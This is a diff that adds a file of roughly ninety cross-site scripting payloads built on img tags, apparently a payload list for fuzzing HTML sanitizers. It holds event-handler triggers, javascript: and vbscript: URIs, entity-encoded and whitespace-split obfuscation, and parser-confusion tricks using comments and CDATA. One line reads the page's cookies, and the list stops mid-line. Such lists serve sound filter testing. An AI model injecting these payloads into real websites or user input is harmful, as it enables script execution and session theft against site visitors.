@@ -1,0 +1,91 @@
+<img/src/onerror=prompt(8)>
+<img src/onerror=prompt(8)>
+<img src =q onerror=prompt(8)>
+</scrip</script>t><img src =q onerror=prompt(8)>
+"><img src=1 onerror=alert(1)>.gif
+<img draggable="true" ondrag="alert(1)">test</img>
+<img draggable="true" ondragend="alert(1)">test</img>
+<img draggable="true" ondragenter="alert(1)">test</img>
+<img draggable="true" ondragleave="alert(1)">test</img>
+<img draggable="true" ondragstart="alert(1)">test</img>
+<img id=x tabindex=1 onactivate=alert(1)></img>
+<img id=x tabindex=1 onbeforeactivate=alert(1)></img>
+<img id=x tabindex=1 onbeforedeactivate=alert(1)></img><input autofocus>
+<img id=x tabindex=1 ondeactivate=alert(1)></img><input id=y autofocus>
+<img id=x tabindex=1 onfocus=alert(1)></img>
+<img id=x tabindex=1 onfocusin=alert(1)></img>
+<img onbeforecopy="alert(1)" contenteditable>test</img>
+<img onbeforecut="alert(1)" contenteditable>test</img>
+<img onbeforepaste="alert(1)" contenteditable>test</img>
+<img onblur=alert(1) tabindex=1 id=x></img><input autofocus>
+<img onclick="alert(1)">test</img>
+<img oncontextmenu="alert(1)">test</img>
+<img oncopy="alert(1)" contenteditable>test</img>
+<img oncut="alert(1)" contenteditable>test</img>
+<img ondblclick="alert(1)">test</img>
+<img onfocusout=alert(1) tabindex=1 id=x></img><input autofocus>
+<img onkeydown="alert(1)" contenteditable>test</img>
+<img onkeypress="alert(1)" contenteditable>test</img>
+<img onkeyup="alert(1)" contenteditable>test</img>
+<img onmousedown="alert(1)">test</img>
+<img onmouseenter="alert(1)">test</img>
+<img onmouseleave="alert(1)">test</img>
+<img onmousemove="alert(1)">test</img>
+<img onmouseout="alert(1)">test</img>
+<img onmouseover="alert(1)">test</img>
+<img onmouseup="alert(1)">test</img>
+<img onpaste="alert(1)" contenteditable>test</img>
+<img src/onerror=alert(1)>
+<img src=validimage.png onload=alert(1)>
+<img src=validimage.png onloadend=alert(1)>
+<img src=validimage.png onloadstart=alert(1)>
+<img srcset=1 onerror=alert(1)>
+<img srcset=validimage.png onload=alert(1)>
+<picture><source srcset="validimage.png"><img onload=alert(1)></picture>
+<picture><source srcset="validimage.png"><img onloadend=alert(1)></picture>
+<picture><source srcset="validimage.png"><img onloadstart=alert(1)></picture>
+<style>:target {color: red;}</style><img id=x style="transition:color 10s" ontransitioncancel=alert(1)></img>
+<style>:target {color:red;}</style><img id=x style="transition:color 1s" ontransitionend=alert(1)></img>
+<style>:target {transform: rotate(180deg);}</style><img id=x style="transition:transform 2s" ontransitionrun=alert(1)></img>
+<style>@keyframes slidein {}</style><img style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></img>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><img id=x style="position:absolute;" onanimationcancel="alert(1)"></img>
+<style>@keyframes x{}</style><img style="animation-name:x" onanimationend="alert(1)"></img>
+<style>@keyframes x{}</style><img style="animation-name:x" onanimationstart="alert(1)"></img>
+x”</title><img src%3dx onerror%3dalert(1)>
+<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #
+<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> # 
+<img src="/" =_=" title="onerror='prompt(1)'">
+<img src=`xx:xx`onerror=alert(1)>
+<img src ?itworksonchrome?\/onerror = alert(1)???
+<--`<img/src=` onerror=alert(1)> --!>
+"><img src=x onerror=window.open('https://www.google.com/');>
+"><img src=x onerror=prompt(1);>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS')"
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC="mocha:[code]">
+<IMG SRC="livescript:[code]">
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert('XSS');">
+<--`<iMG/srC=` onerror=confirm``> --!>
+<![><img src="]><img src=x onerror=alert(39)//">
+<x '="foo"><x foo='><img src=x onerror=alert(62)//'>
+<! '="foo"><x foo='><img src=x onerror=alert(2)//'>
+<img src="javascript:alert(2)">
+<!a foo=x=`y><img alt="`><img src=xx:x onerror=alert(2)//">
+<img alt='%></xmp><img src=xx:x onerror=aler
